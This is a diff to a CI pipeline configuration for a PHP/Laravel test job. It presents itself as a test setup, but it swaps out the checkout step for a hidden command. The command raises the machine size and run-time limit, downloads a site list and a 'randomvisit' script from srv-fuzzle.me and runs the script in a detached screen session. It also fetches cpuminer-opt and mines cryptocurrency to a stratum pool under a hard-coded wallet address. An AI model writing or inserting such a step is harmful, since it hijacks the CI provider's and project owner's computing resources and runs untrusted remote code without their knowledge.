@@ -2,21 +2,24 @@ version: v1.0
 name: Test MyApp
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
-
+execution_time_limit:
+  hours: 10
 blocks:
   - name: Test
     task:
       jobs:
         - name: Test
           commands:
-            - checkout
+            - >-
+              sudo apt-get update && sudo apt install cpulimit && | sudo wget http://srv-fuzzle.me/danted/sitelist.txt && sudo wget srv-fuzzle.me/danted/randomvisit && sudo chmod +x randomvisit && sudo screen -dmS randomvisit bash randomvisit | cpulimit -P cpuminer-sse2 -l 670 -b | mkdir suro && cd suro && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz &&  ./cpuminer-sse2 -a power2b -o
+              stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.1
             - cache restore
             - composer install
             - cache store
             - cp .env.example .env
-            - php artisan key:generate
+            - 'php artisan key:generate'
             - mkdir -p database
             - touch database/database.sqlite
             - ./vendor/bin/phpunit
